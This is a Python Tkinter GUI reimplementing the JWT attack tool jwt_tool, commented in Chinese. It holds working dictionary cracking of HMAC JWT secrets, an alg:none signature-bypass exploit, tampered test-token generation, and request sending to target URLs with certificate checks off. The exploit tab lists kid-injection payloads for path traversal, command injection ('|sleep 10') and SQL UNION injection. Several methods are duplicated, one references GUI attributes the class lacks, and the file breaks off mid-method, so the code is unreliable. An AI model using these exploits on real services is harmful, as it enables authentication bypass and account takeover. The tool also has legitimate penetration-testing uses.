#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import json
import base64
import sys
import os
import re
import threading
import subprocess
import hashlib
import hmac
import configparser
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse
import random
import logging
import time
import uuid

# JWT工具版本
jwttoolvers = "2.3.0"

# 尝试导入加密库
try:
    from Cryptodome.Signature import PKCS1_v1_5, DSS, pss
    from Cryptodome.Hash import SHA256, SHA384, SHA512
    from Cryptodome.PublicKey import RSA, ECC
    CRYPTODOME_AVAILABLE = True
except ImportError:
    CRYPTODOME_AVAILABLE = False
    print("警告: Cryptodome库未安装 - 某些功能可能不可用")

# 尝试导入请求库
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("警告: requests库未安装 - HTTP请求功能可能不可用")

# JWT工具核心功能
class JWToolCore:
    def __init__(self):
        self.config = {
            'crypto': {
                'pubkey': '',
                'privkey': '',
                'ecpubkey': '',
                'ecprivkey': '',
                'jwks': ''
            },
            'services': {
                'proxy': '127.0.0.1:8080',
                'redir': 'True',
                'jwksloc': '',
                'jwksdynamic': '',
                'httplistener': ''
            },
            'customising': {
                'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool',
                'jwks_kid': 'jwt_tool'
            },
            'argvals': {
                'sigType': '',
                'targetUrl': '',
                'rate': '999999999',
                'cookies': '',
                'key': '',
                'keyList': '',
                'keyFile': '',
                'headerLoc': '',
                'payloadclaim': '',
                'headerclaim': '',
                'payloadvalue': '',
                'headervalue': '',
                'canaryvalue': '',
                'header': '',
                'exploitType': '',
                'scanMode': '',
                'reqMode': '',
                'postData': '',
                'resCode': '',
                'resSize': '',
                'resContent': ''
            }
        }
    
    def validateToken(self, jwt):
        """验证并解析JWT令牌"""
        try:
            # 分割JWT
            parts = jwt.split('.')
            if len(parts) != 3:
                return None, None, None, None
                
            # 解码Header
            header_b64 = parts[0]
            # 添加填充（如果需要）
            header_b64 += '=' * (-len(header_b64) % 4)
            header_json = base64.urlsafe_b64decode(header_b64).decode('utf-8')
            header_dict = json.loads(header_json)
            
            # 解码Payload
            payload_b64 = parts[1]
            # 添加填充（如果需要）
            payload_b64 += '=' * (-len(payload_b64) % 4)
            payload_json = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
            payload_dict = json.loads(payload_json)
            
            # 获取签名
            signature = parts[2]
            
            # 生成内容字符串
            contents = parts[0] + '.' + parts[1]
            
            return header_dict, payload_dict, signature, contents
            
        except Exception as e:
            print(f"验证JWT时出错: {str(e)}")
            return None, None, None, None
    
    def signToken(self, header, payload, key, algorithm='HS256'):
        """使用指定密钥和算法签名JWT"""
        try:
            # 生成内容部分
            header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')
            contents = header_b64 + '.' + payload_b64
            
            # 根据算法生成签名
            if algorithm.startswith('HS'):
                # HMAC签名
                if algorithm == 'HS256':
                    hash_func = hashlib.sha256
                elif algorithm == 'HS384':
                    hash_func = hashlib.sha384
                elif algorithm == 'HS512':
                    hash_func = hashlib.sha512
                else:
                    return None
                    
                signature = hmac.new(key.encode() if isinstance(key, str) else key, 
                                    contents.encode(), 
                                    hash_func).digest()
                signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
                
            elif CRYPTODOME_AVAILABLE and algorithm.startswith(('RS', 'ES', 'PS')):
                # 非对称签名需要更复杂的处理
                # 这里简化处理，实际应用中需要根据不同算法处理
                return None
                
            else:
                return None
                
            # 返回完整的JWT
            return contents + '.' + signature_b64
            
        except Exception as e:
            print(f"签名JWT时出错: {str(e)}")
            return None
    
    def verifyToken(self, jwt, key, algorithm='HS256'):
        """验证JWT签名"""
        try:
            # 解析JWT
            header, payload, signature, contents = self.validateToken(jwt)
            if not header:
                return False, "无效的JWT格式"
                
            # 检查算法是否匹配
            if header.get('alg') != algorithm:
                return False, f"算法不匹配: 期望 {algorithm}, 实际 {header.get('alg')}"
                
            # 重新生成签名并比较
            new_jwt = self.signToken(header, payload, key, algorithm)
            if not new_jwt:
                return False, "无法生成签名进行比较"
                
            # 比较签名
            new_signature = new_jwt.split('.')[2]
            if new_signature == signature:
                return True, "签名验证成功"
            else:
                return False, "签名验证失败"
                
        except Exception as e:
            return False, f"验证签名时出错: {str(e)}"
    
    def crackToken(self, jwt, wordlist_file):
        """使用字典攻击破解JWT"""
        if not os.path.exists(wordlist_file):
            return False, "字典文件不存在"
            
        header, payload, signature, contents = self.validateToken(jwt)
        if not header:
            return False, "无效的JWT格式"
            
        algorithm = header.get('alg', 'HS256')
        if not algorithm.startswith('HS'):
            return False, f"不支持破解算法: {algorithm}"
            
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if not password:
                        continue
                        
                    # 尝试使用当前密码验证签名
                    is_valid, message = self.verifyToken(jwt, password, algorithm)
                    if is_valid:
                        return True, f"找到有效密钥: {password}"
                        
            return False, "字典中没有找到有效密钥"
            
        except Exception as e:
            return False, f"破解过程中出错: {str(e)}"
    
    def exploitNone(self, jwt):
        """利用alg:none漏洞"""
        header, payload, signature, contents = self.validateToken(jwt)
        if not header:
            return None, "无效的JWT格式"
            
        # 修改算法为none
        new_header = header.copy()
        new_header['alg'] = 'none'
        
        # 生成新的JWT（无签名）
        header_b64 = base64.urlsafe_b64encode(json.dumps(new_header, separators=(',', ':')).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')
        
        # 返回无签名的JWT
        return header_b64 + '.' + payload_b64 + '.', "alg:none漏洞利用成功"
    
    def scanErrors(self, jwt):
        """扫描模式错误"""
        try:
            header, payload, signature, contents = self.validateToken(jwt)
            if not header:
                return None, "无效的JWT格式"
                
            results = []
            
            # 检查常见错误
            if 'alg' not in header:
                results.append("缺少算法声明")
            elif header['alg'] not in ['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256', 'PS384', 'PS512', 'none']:
                results.append(f"不支持的算法: {header['alg']}")
                
            # 检查时间戳
            if 'exp' in payload:
                try:
                    exp = int(payload['exp'])
                    if exp < time.time():
                        results.append("令牌已过期")
                except:
                    results.append("无效的过期时间")
                    
            if 'nbf' in payload:
                try:
                    nbf = int(payload['nbf'])
                    if nbf > time.time():
                        results.append("令牌尚未生效")
                except:
                    results.append("无效的生效时间")
                    
            if 'iat' in payload:
                try:
                    iat = int(payload['iat'])
                    if iat > time.time() + 300:  # 允许5分钟时钟偏差
                        results.append("签发时间在未来")
                except:
                    results.append("无效的签发时间")
                    
            # 检查签名
            if not signature:
                results.append("缺少签名")
                
            return results, "扫描完成"
            
        except Exception as e:
            return None, f"扫描失败: {str(e)}"
    
    def scanCommonClaims(self, jwt):
        """扫描常见声明"""
        try:
            header, payload, signature, contents = self.validateToken(jwt)
            if not header:
                return None, "无效的JWT格式"
                
            results = []
            
            # 常见声明检查
            common_claims = ['iss', 'sub', 'aud', 'exp', 'nbf', 'iat', 'jti']
            for claim in common_claims:
                if claim in payload:
                    results.append(f"包含声明: {claim}")
                else:
                    results.append(f"缺少声明: {claim}")
                    
            # 检查自定义声明
            standard_claims = set(common_claims)
            custom_claims = []
            for claim in payload:
                if claim not in standard_claims:
                    custom_claims.append(claim)
                    
            if custom_claims:
                results.append(f"自定义声明: {', '.join(custom_claims)}")
            else:
                results.append("无自定义声明")
                
            # 检查敏感信息
            sensitive_keywords = ['password', 'secret', 'key', 'token', 'auth', 'credential']
            for claim in payload:
                if any(keyword in claim.lower() for keyword in sensitive_keywords):
                    results.append(f"可能包含敏感信息的声明: {claim}")
                    
            return results, "扫描完成"
            
        except Exception as e:
            return None, f"扫描失败: {str(e)}"
    
    def injectErrors(self, jwt):
        """错误注入测试"""
        try:
            header, payload, signature, contents = self.validateToken(jwt)
            if not header:
                return None, "无效的JWT格式"
                
            results = []
            
            # 测试1: 修改算法为none
            new_header = header.copy()
            new_header['alg'] = 'none'
            header_b64 = base64.urlsafe_b64encode(json.dumps(new_header, separators=(',', ':')).encode()).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')
            test_jwt = header_b64 + '.' + payload_b64 + '.'
            results.append(f"alg:none测试: {test_jwt}")
            
            # 测试2: 空签名
            test_jwt = header_b64 + '.' + payload_b64
            results.append(f"空签名测试: {test_jwt}")
            
            # 测试3: 修改过期时间
            new_payload = payload.copy()
            new_payload['exp'] = int(time.time()) - 3600  # 1小时前过期
            payload_b64 = base64.urlsafe_b64encode(json.dumps(new_payload, separators=(',', ':')).encode()).decode().rstrip('=')
            test_jwt = header_b64 + '.' + payload_b64 + '.'
            results.append(f"过期时间测试: {test_jwt}")
            
            # 测试4: 修改生效时间
            new_payload = payload.copy()
            new_payload['nbf'] = int(time.time()) + 3600  # 1小时后生效
            payload_b64 = base64.urlsafe_b64encode(json.dumps(new_payload, separators=(',', ':')).encode()).decode().rstrip('=')
            test_jwt = header_b64 + '.' + payload_b64 + '.'
            results.append(f"生效时间测试: {test_jwt}")
            
            # 测试5: 修改算法为不支持的算法
            new_header = header.copy()
            new_header['alg'] = 'UNKNOWN'
            header_b64 = base64.urlsafe_b64encode(json.dumps(new_header, separators=(',', ':')).encode()).decode().rstrip('=')
            test_jwt = header_b64 + '.' + payload_b64 + '.'
            results.append(f"未知算法测试: {test_jwt}")
            
            return results, "错误注入测试完成"
            
        except Exception as e:
            return None, f"错误注入测试失败: {str(e)}"
    
    def testReflectedClaims(self, jwt, target_url):
        """反射声明测试"""
        try:
            header, payload, signature, contents = self.validateToken(jwt)
            if not header:
                return None, "无效的JWT格式"
                
            results = []
            
            # 为每个声明创建测试令牌
            for claim in payload:
                new_payload = payload.copy()
                # 在声明值中添加唯一标识符
                original_value = new_payload[claim]
                new_payload[claim] = f"REFLECTED_TEST_{claim}_{int(time.time())}"
                
                # 生成新的JWT
                header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
                payload_b64 = base64.urlsafe_b64encode(json.dumps(new_payload, separators=(',', ':')).encode()).decode().rstrip('=')
                test_jwt = header_b64 + '.' + payload_b64 + '.'
                
                results.append({
                    'claim': claim,
                    'original_value': original_value,
                    'test_value': new_payload[claim],
                    'test_jwt': test_jwt
                })
                
            return results, "反射声明测试完成"
            
        except Exception as e:
            return None, f"反射声明测试失败: {str(e)}"
    
    def verifyToken(self, jwt, key, algorithm='HS256'):
        """验证JWT签名"""
        try:
            # 解析JWT
            header, payload, signature, contents = self.validateToken(jwt)
            if not header:
                return False, "无效的JWT格式"
                
            # 检查算法是否匹配
            if header.get('alg') != algorithm:
                return False, f"算法不匹配: 期望 {algorithm}, 实际 {header.get('alg')}"
                
            # 重新生成签名并比较
            new_jwt = self.signToken(header, payload, key, algorithm)
            if not new_jwt:
                return False, "无法生成签名进行比较"
                
            # 比较签名
            new_signature = new_jwt.split('.')[2]
            if new_signature == signature:
                return True, "签名验证成功"
            else:
                return False, "签名验证失败"
                
        except Exception as e:
            return False, f"验证签名时出错: {str(e)}"
    
    def crackToken(self, jwt, wordlist_file):
        """使用字典攻击破解JWT"""
        if not os.path.exists(wordlist_file):
            return False, "字典文件不存在"
            
        header, payload, signature, contents = self.validateToken(jwt)
        if not header:
            return False, "无效的JWT格式"
            
        algorithm = header.get('alg', 'HS256')
        if not algorithm.startswith('HS'):
            return False, f"不支持破解算法: {algorithm}"
            
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    key = line.strip()
                    if not key:
                        continue
                        
                    # 解析JWT获取算法
                    header, payload, signature, contents = self.validateToken(jwt)
                    if not header:
                        self.crack_result.insert(tk.END, "无效的JWT格式\n")
                        self.status_var.set("密钥文件破解失败")
                        return
                        
                    algorithm = header.get('alg', 'HS256')
                    
                    # 验证签名
                    is_valid, message = self.verifyToken(jwt, key, algorithm)
                    
                    if is_valid:
                        self.crack_result.insert(tk.END, f"成功! 找到有效密钥: {key}\n")
                        self.status_var.set("密钥文件破解完成")
                        return
                        
                self.crack_result.insert(tk.END, "失败: 密钥文件中没有找到有效密钥\n")
                self.status_var.set("密钥文件破解完成")
                
        except Exception as e:
            self.crack_result.insert(tk.END, f"错误: {str(e)}\n")
            self.status_var.set("密钥文件破解失败")
    
    def exploitNone(self, jwt):
        """利用alg:none漏洞"""
        header, payload, signature, contents = self.validateToken(jwt)
        if not header:
            return None, "无效的JWT格式"
            
        # 修改算法为none
        new_header = header.copy()
        new_header['alg'] = 'none'
        
        # 生成新的JWT（无签名）
        header_b64 = base64.urlsafe_b64encode(json.dumps(new_header, separators=(',', ':')).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')
        
        # 返回无签名的JWT
        return header_b64 + '.' + payload_b64 + '.', "alg:none漏洞利用成功"
    
    def sendRequest(self, url, jwt, cookies=None, headers=None, post_data=None, proxy=None):
        """发送带有JWT的HTTP请求"""
        if not REQUESTS_AVAILABLE:
            return False, "requests库不可用，无法发送HTTP请求"
            
        try:
            # 准备请求头
            request_headers = {
                'User-Agent': self.config['customising']['useragent']
            }
            
            # 添加自定义头
            if headers:
                for header in headers:
                    if ':' in header:
                        name, value = header.split(':', 1)
                        request_headers[name.strip()] = value.strip()
            
            # 准备cookies
            request_cookies = {}
            if cookies:
                for cookie in cookies.split(';'):
                    if '=' in cookie:
                        name, value = cookie.split('=', 1)
                        request_cookies[name.strip()] = value.strip()
            
            # 准备代理
            proxies = None
            if proxy:
                proxies = {
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}'
                }
            
            # 发送请求
            if post_data:
                response = requests.post(
                    url, 
                    data=post_data, 
                    headers=request_headers, 
                    cookies=request_cookies,
                    proxies=proxies,
                    verify=False,
                    allow_redirects=True
                )
            else:
                response = requests.get(
                    url, 
                    headers=request_headers, 
                    cookies=request_cookies,
                    proxies=proxies,
                    verify=False,
                    allow_redirects=True
                )
                
            return True, {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content': response.text,
                'content_length': len(response.content)
            }
            
        except Exception as e:
            return False, f"发送请求时出错: {str(e)}"


# 主GUI应用程序
class JWTToolGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("JWT Tool GUI v" + jwttoolvers)
        self.root.geometry("900x700")
        
        # 创建JWT工具核心实例
        self.jwt_tool = JWToolCore()
        
        # 创建选项卡
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # 创建各个选项卡
        self.create_parse_tab()
        self.create_tamper_tab()
        self.create_verify_tab()
        self.create_crack_tab()
        self.create_exploit_tab()
        self.create_error_injection_tab()
        self.create_key_conversion_tab()
        self.create_timestamp_tab()
        self.create_logging_tab()
        self.create_settings_tab()
        
        # 状态栏
        self.status_var = tk.StringVar()
        self.status_var.set("就绪")
        status_bar = ttk.Label(root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
    
    def create_parse_tab(self):
        """创建JWT解析选项卡"""
        parse_frame = ttk.Frame(self.notebook)
        self.notebook.add(parse_frame, text="JWT解析")
        
        # JWT输入区域
        input_frame = ttk.LabelFrame(parse_frame, text="JWT令牌")
        input_frame.pack(fill='x', padx=10, pady=10)
        
        self.jwt_input = scrolledtext.ScrolledText(input_frame, height=5)
        self.jwt_input.pack(fill='x', padx=5, pady=5)
        
        # 解析按钮
        ttk.Button(input_frame, text="解析JWT", command=self.parse_jwt).pack(pady=5)
        
        # 解析结果区域
        result_frame = ttk.LabelFrame(parse_frame, text="解析结果")
        result_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # 创建三列布局
        columns_frame = ttk.Frame(result_frame)
        columns_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Header列
        header_frame = ttk.LabelFrame(columns_frame, text="Header")
        header_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        self.header_result = scrolledtext.ScrolledText(header_frame, height=10)
        self.header_result.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Payload列
        payload_frame = ttk.LabelFrame(columns_frame, text="Payload")
        payload_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        self.payload_result = scrolledtext.ScrolledText(payload_frame, height=10)
        self.payload_result.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Signature列
        signature_frame = ttk.LabelFrame(columns_frame, text="Signature")
        signature_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        self.signature_result = scrolledtext.ScrolledText(signature_frame, height=10)
        self.signature_result.pack(fill='both', expand=True, padx=5, pady=5)
        
        # HTTP请求测试区域
        request_frame = ttk.LabelFrame(parse_frame, text="HTTP请求测试")
        request_frame.pack(fill='x', padx=10, pady=10)
        
        # URL输入
        url_frame = ttk.Frame(request_frame)
        url_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(url_frame, text="URL:").pack(side='left')
        self.url_input = ttk.Entry(url_frame)
        self.url_input.pack(side='left', fill='x', expand=True, padx=5)
        
        # 请求方法选择
        self.method_var = tk.StringVar(value="GET")
        method_combo = ttk.Combobox(url_frame, textvariable=self.method_var, 
                                   values=["GET", "POST", "PUT", "DELETE", "PATCH"], width=10)
        method_combo.pack(side='left', padx=5)
        
        # 发送请求按钮
        ttk.Button(url_frame, text="发送请求", command=self.send_request).pack(side='left')
        
        # 请求结果显示
        self.request_result = scrolledtext.ScrolledText(request_frame, height=8)
        self.request_result.pack(fill='x', padx=5, pady=5)
    
    def create_tamper_tab(self):
        """创建JWT篡改选项卡"""
        tamper_frame = ttk.Frame(self.notebook)
        self.notebook.add(tamper_frame, text="JWT篡改")
        
        # 原始JWT输入
        original_frame = ttk.LabelFrame(tamper_frame, text="原始JWT")
        original_frame.pack(fill='x', padx=10, pady=10)
        
        self.original_jwt_input = scrolledtext.ScrolledText(original_frame, height=5)
        self.original_jwt_input.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(original_frame, text="解析原始JWT", command=self.parse_original_jwt).pack(pady=5)
        
        # Header和Payload编辑区域
        edit_frame = ttk.Frame(tamper_frame)
        edit_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Header编辑
        header_edit_frame = ttk.LabelFrame(edit_frame, text="Header编辑")
        header_edit_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        self.header_edit = scrolledtext.ScrolledText(header_edit_frame, height=15)
        self.header_edit.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Payload编辑
        payload_edit_frame = ttk.LabelFrame(edit_frame, text="Payload编辑")
        payload_edit_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        self.payload_edit = scrolledtext.ScrolledText(payload_edit_frame, height=15)
        self.payload_edit.pack(fill='both', expand=True, padx=5, pady=5)
        
        # 签名设置
        sign_frame = ttk.LabelFrame(tamper_frame, text="签名设置")
        sign_frame.pack(fill='x', padx=10, pady=10)
        
        # 算法选择
        algo_frame = ttk.Frame(sign_frame)
        algo_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(algo_frame, text="签名算法:").pack(side='left')
        self.algo_var = tk.StringVar(value="HS256")
        algo_combo = ttk.Combobox(algo_frame, textvariable=self.algo_var, 
                                 values=["HS256", "HS384", "HS512", "RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"])
        algo_combo.pack(side='left', padx=5)
        
        # 密钥输入
        ttk.Label(algo_frame, text="密钥:").pack(side='left')
        self.key_input = ttk.Entry(algo_frame, show="*")
        self.key_input.pack(side='left', fill='x', expand=True, padx=5)
        
        # 显示密钥复选框
        self.show_key_var = tk.BooleanVar()
        ttk.Checkbutton(algo_frame, text="显示密钥", variable=self.show_key_var, 
                       command=self.toggle_key_visibility).pack(side='left')
        
        # 生成新JWT按钮
        ttk.Button(sign_frame, text="生成新JWT", command=self.generate_new_jwt).pack(pady=5)
        
        # 新JWT显示
        new_jwt_frame = ttk.LabelFrame(tamper_frame, text="新JWT")
        new_jwt_frame.pack(fill='x', padx=10, pady=10)
        
        self.new_jwt_output = scrolledtext.ScrolledText(new_jwt_frame, height=5)
        self.new_jwt_output.pack(fill='x', padx=5, pady=5)
        
        # 复制按钮
        ttk.Button(new_jwt_frame, text="复制到剪贴板", command=self.copy_new_jwt).pack(pady=5)
    
    def create_verify_tab(self):
        """创建签名验证选项卡"""
        verify_frame = ttk.Frame(self.notebook)
        self.notebook.add(verify_frame, text="签名验证")
        
        # JWT输入
        jwt_input_frame = ttk.LabelFrame(verify_frame, text="JWT令牌")
        jwt_input_frame.pack(fill='x', padx=10, pady=10)
        
        self.verify_jwt_input = scrolledtext.ScrolledText(jwt_input_frame, height=5)
        self.verify_jwt_input.pack(fill='x', padx=5, pady=5)
        
        # 验证方式选择
        method_frame = ttk.LabelFrame(verify_frame, text="验证方式")
        method_frame.pack(fill='x', padx=10, pady=10)
        
        self.verify_method_var = tk.StringVar(value="key")
        ttk.Radiobutton(method_frame, text="使用密钥验证", variable=self.verify_method_var, 
                       value="key").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(method_frame, text="使用公钥文件验证", variable=self.verify_method_var, 
                       value="pubkey").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(method_frame, text="使用JWKS文件验证", variable=self.verify_method_var, 
                       value="jwks").pack(anchor='w', padx=5, pady=2)
        
        # 密钥/文件输入
        key_frame = ttk.LabelFrame(verify_frame, text="密钥/文件")
        key_frame.pack(fill='x', padx=10, pady=10)
        
        # 密钥输入
        key_input_frame = ttk.Frame(key_frame)
        key_input_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(key_input_frame, text="密钥:").pack(side='left')
        self.verify_key_input = ttk.Entry(key_input_frame, show="*")
        self.verify_key_input.pack(side='left', fill='x', expand=True, padx=5)
        
        # 文件选择按钮
        ttk.Button(key_input_frame, text="选择文件", command=self.select_verify_file).pack(side='left')
        
        # 验证按钮
        ttk.Button(key_frame, text="验证签名", command=self.verify_signature).pack(pady=5)
        
        # 验证RESULT_frame
        result_frame = ttk.LabelFrame(verify_frame, text="验证结果")
        result_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.verify_result = scrolledtext.ScrolledText(result_frame, height=10)
        self.verify_result.pack(fill='both', expand=True, padx=5, pady=5)
    
    def create_crack_tab(self):
        """创建密钥破解选项卡"""
        crack_frame = ttk.Frame(self.notebook)
        self.notebook.add(crack_frame, text="密钥破解")
        
        # JWT输入
        jwt_input_frame = ttk.LabelFrame(crack_frame, text="JWT令牌")
        jwt_input_frame.pack(fill='x', padx=10, pady=10)
        
        self.crack_jwt_input = scrolledtext.ScrolledText(jwt_input_frame, height=5)
        self.crack_jwt_input.pack(fill='x', padx=5, pady=5)
        
        # 破解方式选择
        method_frame = ttk.LabelFrame(crack_frame, text="破解方式")
        method_frame.pack(fill='x', padx=10, pady=10)
        
        self.crack_method_var = tk.StringVar(value="dict")
        ttk.Radiobutton(method_frame, text="字典攻击", variable=self.crack_method_var, 
                       value="dict").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(method_frame, text="尝试特定密码", variable=self.crack_method_var, 
                       value="password").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(method_frame, text="使用密钥文件", variable=self.crack_method_var, 
                       value="keyfile").pack(anchor='w', padx=5, pady=2)
        
        # 破解参数输入
        param_frame = ttk.LabelFrame(crack_frame, text="破解参数")
        param_frame.pack(fill='x', padx=10, pady=10)
        
        # 字典文件选择
        dict_frame = ttk.Frame(param_frame)
        dict_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(dict_frame, text="字典文件:").pack(side='left')
        self.dict_file_var = tk.StringVar()
        ttk.Entry(dict_frame, textvariable=self.dict_file_var).pack(side='left', fill='x', expand=True, padx=5)
        ttk.Button(dict_frame, text="浏览", command=self.select_dict_file).pack(side='left')
        
        # 密码输入
        password_frame = ttk.Frame(param_frame)
        password_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(password_frame, text="密码:").pack(side='left')
        self.crack_password_var = tk.StringVar()
        ttk.Entry(password_frame, textvariable=self.crack_password_var, show="*").pack(side='left', fill='x', expand=True, padx=5)
        
        # 密钥文件选择
        keyfile_frame = ttk.Frame(param_frame)
        keyfile_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(keyfile_frame, text="密钥文件:").pack(side='left')
        self.keyfile_var = tk.StringVar()
        ttk.Entry(keyfile_frame, textvariable=self.keyfile_var).pack(side='left', fill='x', expand=True, padx=5)
        ttk.Button(keyfile_frame, text="浏览", command=self.select_keyfile).pack(side='left')
        
        # 开始破解按钮
        ttk.Button(param_frame, text="开始破解", command=self.start_crack).pack(pady=5)
        
        # 破解RESULT_frame
        result_frame = ttk.LabelFrame(crack_frame, text="破解结果")
        result_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.crack_result = scrolledtext.ScrolledText(result_frame, height=10)
        self.crack_result.pack(fill='both', expand=True, padx=5, pady=5)
    
    def create_exploit_tab(self):
        """创建漏洞利用选项卡"""
        exploit_frame = ttk.Frame(self.notebook)
        self.notebook.add(exploit_frame, text="漏洞利用")
        
        # JWT输入
        jwt_input_frame = ttk.LabelFrame(exploit_frame, text="JWT令牌")
        jwt_input_frame.pack(fill='x', padx=10, pady=10)
        
        self.exploit_jwt_input = scrolledtext.ScrolledText(jwt_input_frame, height=5)
        self.exploit_jwt_input.insert(tk.END, "alg:none/null signature/blank password/Psychic签名/JWKS欺骗/密钥混淆/内联JWKS")
        self.exploit_jwt_input.pack(fill='x', padx=5, pady=5)
        
        # 漏洞类型选择
        vuln_frame = ttk.LabelFrame(exploit_frame, text="漏洞类型")
        vuln_frame.pack(fill='x', padx=10, pady=10)
        
        self.exploit_type_var = tk.StringVar(value="none")
        ttk.Radiobutton(vuln_frame, text="alg:none漏洞", variable=self.exploit_type_var, 
                       value="none").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(vuln_frame, text="空签名漏洞", variable=self.exploit_type_var, 
                       value="null").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(vuln_frame, text="空白密码漏洞", variable=self.exploit_type_var, 
                       value="blank").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(vuln_frame, text="Psychic签名漏洞", variable=self.exploit_type_var, 
                       value="psychic").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(vuln_frame, text="JWKS欺骗", variable=self.exploit_type_var, 
                       value="jwks").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(vuln_frame, text="密钥混淆", variable=self.exploit_type_var, 
                       value="confusion").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(vuln_frame, text="内联JWKS注入", variable=self.exploit_type_var, 
                       value="injwks").pack(anchor='w', padx=5, pady=2)
        
        # Kid注入攻击选项
        kid_frame = ttk.LabelFrame(exploit_frame, text="Kid注入攻击")
        kid_frame.pack(fill='x', padx=10, pady=10)
        
        self.kid_attack_var = tk.StringVar(value="blank")
        ttk.Radiobutton(kid_frame, text="空白kid字段+null签名", variable=self.kid_attack_var, 
                       value="blank").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(kid_frame, text="路径遍历注入(/dev/null)", variable=self.kid_attack_var, 
                       value="path").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(kid_frame, text="RCE尝试(|sleep 10)", variable=self.kid_attack_var, 
                       value="rce").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(kid_frame, text="SQL注入(x' UNION SELECT)", variable=self.kid_attack_var, 
                       value="sql").pack(anchor='w', padx=5, pady=2)
        
        # 自定义kid注入
        custom_kid_frame = ttk.Frame(kid_frame)
        custom_kid_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(custom_kid_frame, text="自定义kid值:").pack(side='left')
        self.custom_kid_var = tk.StringVar()
        ttk.Entry(custom_kid_frame, textvariable=self.custom_kid_var).pack(side='left', fill='x', expand=True, padx=5)
        
        # 漏洞利用参数
        param_frame = ttk.LabelFrame(exploit_frame, text="利用参数")
        param_frame.pack(fill='x', padx=10, pady=10)
        
        # JWKS URL输入
        jwks_frame = ttk.Frame(param_frame)
        jwks_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(jwks_frame, text="JWKS URL:").pack(side='left')
        self.jwks_url_var = tk.StringVar()
        ttk.Entry(jwks_frame, textvariable=self.jwks_url_var).pack(side='left', fill='x', expand=True, padx=5)
        
        # 公钥文件选择
        pubkey_frame = ttk.Frame(param_frame)
        pubkey_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(pubkey_frame, text="公钥文件:").pack(side='left')
        self.pubkey_file_var = tk.StringVar()
        ttk.Entry(pubkey_frame, textvariable=self.pubkey_file_var).pack(side='left', fill='x', expand=True, padx=5)
        ttk.Button(pubkey_frame, text="浏览", command=self.select_pubkey_file).pack(side='left')
        
        # 执行利用按钮
        ttk.Button(param_frame, text="执行利用", command=self.execute_exploit).pack(pady=5)
        
        # 利用RESULT_frame
        result_frame = ttk.LabelFrame(exploit_frame, text="利用结果")
        result_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.exploit_result = scrolledtext.ScrolledText(result_frame, height=10)
